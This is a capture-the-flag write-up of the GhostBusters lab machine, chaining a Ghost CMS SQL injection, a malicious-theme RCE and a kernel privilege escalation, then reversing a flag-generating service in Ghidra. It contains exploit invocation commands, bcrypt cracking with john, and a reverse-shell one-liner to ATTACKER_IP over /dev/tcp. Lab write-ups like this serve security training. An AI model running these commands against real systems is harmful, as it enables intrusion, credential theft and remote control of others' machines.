# GhostBusters — ACLabs.pro
<img width="1200" height="630" alt="ghostbusters-writeup" src="https://github.com/user-attachments/assets/b9adb0d0-3838-479c-8570-740564161b63" />


![](https://img.shields.io/badge/Platform-ACLabs.pro-blue?style=for-the-badge)
![](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![](https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white)
![](https://img.shields.io/badge/Category-Web%20%7C%20Linux-orange?style=for-the-badge)

## Summary

GhostBusters is an **Easy**-rated Linux machine on ACLabs.pro running Ghost CMS 6.19 on nginx. An unauthenticated SQL injection (**CVE-2026-26980**) dumps admin credentials from the database. After cracking the bcrypt hash, a malicious theme upload exploit (**CVE-2026-29053**) achieves RCE as user `slimer`. A Debian 6.12 kernel is vulnerable to **DirtyFrag**, granting root. However, neither flag exists yet — a custom security service binary (`secservice`) monitors the filesystem and only generates flags when specific conditions are met: the user flag appears after removing a sentinel PNG file, and the root flag materializes after changing the root password (altering the hash in `/etc/shadow`). Understanding this requires Ghidra analysis of the binary's two monitoring loops.

```
Ghost CMS 6.19 → CVE-2026-26980 (SQLi) → Admin Creds → CVE-2026-29053 (Theme RCE)
  → Shell as slimer → DirtyFrag Kernel Exploit → Root
  → Binary Reversing → Remove sentinel file (User Flag) → Change root password (Root Flag)
```

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | ID |
|:------|:-------|:----------|:---|
| Port scanning | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Network Service Discovery](https://attack.mitre.org/techniques/T1046/) | `T1046` |
| CMS version fingerprinting | [Reconnaissance](https://attack.mitre.org/tactics/TA0043/) | [Gather Victim Host Info: Client Configurations](https://attack.mitre.org/techniques/T1592/004/) | `T1592.004` |
| Unauthenticated SQLi (CVE-2026-26980) | [Initial Access](https://attack.mitre.org/tactics/TA0001/) | [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) | `T1190` |
| bcrypt hash cracking | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/) | `T1110.002` |
| RCE via malicious theme (CVE-2026-29053) | [Execution](https://attack.mitre.org/tactics/TA0002/) | [Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/) | `T1059.004` |
| DirtyFrag kernel exploit | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/) | `T1068` |
| Custom SUID binary analysis | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [File and Directory Discovery](https://attack.mitre.org/techniques/T1083/) | `T1083` |

## CVE Reference

| CVE | CVSS 3.1 | Severity | Description |
|:----|:---------|:---------|:------------|
| [CVE-2026-26980](https://github.com/vognik/CVE-2026-26980) | **7.5** | High | Ghost CMS ≤6.19 — unauthenticated SQL injection via Content API allows extraction of user credentials (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| [CVE-2026-29053](https://github.com/AC8999/CVE-2026-29053) | **7.2** | High | Ghost CMS — authenticated RCE via malicious theme upload; crafted Handlebars template executes arbitrary commands (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) |
| CVE-2026-43284 | **8.8** (est.) | High | DirtyFrag — Linux kernel 6.12 local privilege escalation via memory fragmentation abuse (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |

## Reconnaissance — `T1046` `T1592.004`

### Nmap

```bash
sudo nmap -sC -sV -v 10.10.10.228
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u2
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://Ghostbusters.acl/
```

Standard setup — SSH on 22, nginx on 80 redirecting to `Ghostbusters.acl`. Add to `/etc/hosts`.

### CMS Identification

<img width="1919" height="962" alt="Aclabs_ghostbusters_web" src="https://github.com/user-attachments/assets/99266d52-2c67-41af-b903-79b689b53931" />

I recognized this immediately — it's **Ghost CMS** with the default Casper theme. The same engine that powers my own blog at alfabuster.com, which makes this feel a bit like breaking into your own house.

The source code reveals the version:

<img width="1919" height="962" alt="Aclabs_ghostbusters_web_source_code" src="https://github.com/user-attachments/assets/9445f3cb-c253-415a-8a50-5a78516b7103" />

**Ghost CMS 6.19** — not the latest, and 2026 has been a prolific year for Ghost CVEs.

## Exploitation — `T1190` `T1110.002`

### CVE-2026-26980 — Unauthenticated SQLi

This vulnerability targets the Ghost Content API, extracting credentials without authentication:

```bash
python3 main.py -u http://ghostbusters.acl/ -d mysql -T users -C email,password
```

<img width="1919" height="961" alt="Aclabs_ghostbusters_check_cve" src="https://github.com/user-attachments/assets/914f7985-e1ff-4e2a-bb2c-5ce4ad4b6ddf" />

> **Note:** The `-d mysql` flag is important — Ghost uses MySQL/MariaDB in production deployments, not SQLite.

The output yields an email and a **bcrypt** hash (`$2*$`). Crack it with `john`:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Log in to the admin panel at `http://ghostbusters.acl/ghost/#/signin`.

### CVE-2026-29053 — RCE via Malicious Theme Upload

The admin panel has a Code Injection feature, but direct reverse shell injection didn't work. A second CVE provides a cleaner path — RCE through a crafted theme archive:

```bash
python3 exploit.py -i http://10.20.10.5 -p 4444
```

<img width="1919" height="427" alt="Aclabs_ghostbusters_exploit_rce" src="https://github.com/user-attachments/assets/f221e5a2-5a27-4dd6-8ba7-60018f366082" />

Upload the generated archive in the admin panel under Design → Change Theme:

<img width="1919" height="962" alt="Aclabs_ghostbusters_admin_change_theme" src="https://github.com/user-attachments/assets/e5b9cf68-d22a-42b3-86e9-ea4dc0a2bac4" />

Activate the theme, then create a new page with the slug `/rce`:

<img width="1919" height="962" alt="Aclabs_ghostbusters_admin_create_page" src="https://github.com/user-attachments/assets/6bb6d33f-ce66-442d-9c04-35a7b1abde97" />

<img width="1919" height="962" alt="Aclabs_ghostbusters_admin_create_page_rce" src="https://github.com/user-attachments/assets/275845c7-b662-4309-a6ab-ddca1a4a38a1" />

Navigate to the page to trigger the reverse shell:

<img width="1919" height="960" alt="Aclabs_ghostbusters_revrse_shell" src="https://github.com/user-attachments/assets/46595ab2-ae70-4a08-b2b5-f0706c29ae57" />

The initial shell is limited — stabilize it immediately:

```bash
bash -c '/bin/sh -i >& /dev/tcp/ATTACKER_IP/4445 0>&1'
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo && fg
export TERM=xterm-256color
reset
```

## Privilege Escalation — `T1068`

### DirtyFrag Kernel Exploit

No flags in the home directory — just a hidden `.slimer/` folder containing an image that yields nothing via `exiftool` or `steghide`.

The kernel version (Debian 6.12) is vulnerable to **DirtyFrag**:

<img width="1919" height="931" alt="Aclabs_ghostbusters_root" src="https://github.com/user-attachments/assets/c0d895ac-2a54-437e-ab3b-3f21db7adf07" />

Root obtained. But the flags still don't exist.

## The Flag Puzzle — Binary Reversing — `T1083`

### The Letter

A file in `/root/` provides the first hint:

```
From: Peter Venkman, Ghostbusters

The root account may have been compromised.
To complete the operation, change the root password.
After this, you will receive the final report.
```

Changing the password (`sudo passwd`) does nothing immediately visible. Time to dig deeper.

### Discovering the Security Service

LinPEAS identifies an unusual service:

```
secservice.service  loaded active running  Ghostbusters Security Service
└─ RUNS_AS_ROOT: Service runs as root
```

```bash
file /usr/local/bin/secservice
```

An ELF 64-bit binary. Transfer it to Kali and open in Ghidra.

### Ghidra Analysis

<img width="1919" height="962" alt="Aclabs_ghostbusters_ghidra" src="https://github.com/user-attachments/assets/9bbab258-a02b-4a6c-93e5-97792491cafa" />

The binary contains **two monitoring loops**, each checking a condition every 15 seconds:

**Loop 1 — User Flag Trigger:**

```c
iVar1 = lstat("/home/slimer/.slimer/slimer.png", &sStack_10c8);
while ((iVar1 == 0 && ((sStack_10c8.st_mode & 0xf000) == 0x8000))) {
    sleep(0xf);
    iVar1 = lstat("/home/slimer/.slimer/slimer.png", &sStack_10c8);
}
create_user_report();
```

The loop runs as long as `/home/slimer/.slimer/slimer.png` exists **and** is a regular file (`S_IFREG = 0x8000`). When the file is removed, renamed, or replaced with a symlink, the loop breaks and `create_user_report()` generates the user flag.

**Loop 2 — Root Flag Trigger:**

```c
while (true) {
    iVar1 = get_root_hash(local_1038, 0x1000);
    if ((iVar1 != 0) && (iVar1 = strcmp(local_1038, (char *)&initial_root_hash), iVar1 != 0))
        break;
    sleep(0xf);
}
create_report("/root/final_report.txt", &DAT_001021c0, &root_flag, 0x180);
```

The binary captures the root password hash at startup. Every 15 seconds, it re-reads `/etc/shadow` and compares. When the hash changes (i.e., the root password has been changed), the loop breaks and `create_report()` writes the root flag to `/root/final_report.txt`.

### Triggering the Flags

**User flag** — rename the sentinel file:

```bash
mv /home/slimer/.slimer/slimer.png /home/slimer/.slimer/slimer.png.bak
```

Wait 15 seconds:

<img width="1919" height="962" alt="Aclabs_ghostbusters_user_flag" src="https://github.com/user-attachments/assets/3552c4ba-f33c-49f2-9da1-fe803e7a522a" />

**Root flag** — change the root password (as hinted in the letter):

```bash
passwd root
```

Wait 15 seconds:

<img width="1109" height="560" alt="Aclabs_ghostbusters_root_flag" src="https://github.com/user-attachments/assets/729419c4-cbb5-4aa4-8808-db494168e424" />

Both flags captured.

## Lessons Learned

1. **Ghost CMS had a rough 2026.** Two CVEs chained together — unauthenticated SQLi for credential extraction and authenticated RCE via theme upload — provide a complete takeover path. CMS platforms that support custom themes or plugins will always be high-value targets; the attack surface they introduce is enormous.

2. **"Easy" machines can hide non-obvious flag mechanics.** Getting root was straightforward, but the flags didn't exist until specific conditions were met. Without the letter hint and Ghidra analysis, this machine would feel impossible despite having full root access — a humbling reminder that privilege escalation and objective completion are not the same thing.

3. **Custom binaries deserve immediate attention.** The `secservice` binary running as a systemd service was the key to understanding the entire flag mechanism. LinPEAS flagged it, but only Ghidra revealed the two monitoring loops and their trigger conditions. When you see an unfamiliar binary running as root, reverse it first — don't waste hours searching for flags that don't exist yet.

4. **`lstat` checks file type, not just existence.** The first loop specifically checked for a *regular file* (`S_IFREG`). Replacing the PNG with a symlink, renaming it, or deleting it all break the condition. Understanding the exact check in the decompiled code prevents trial-and-error guessing.

5. **Password changes as exploitation triggers are rare but memorable.** The root flag required changing the root password to alter the hash in `/etc/shadow` — a condition the binary verified by comparing against its startup snapshot. This is an unusual CTF mechanic that mirrors real-world incident response: changing compromised credentials is the final remediation step, and here it's literally what unlocks the completion flag.

---

*Writeup by [@alfabuster](https://github.com/alfabuster)*
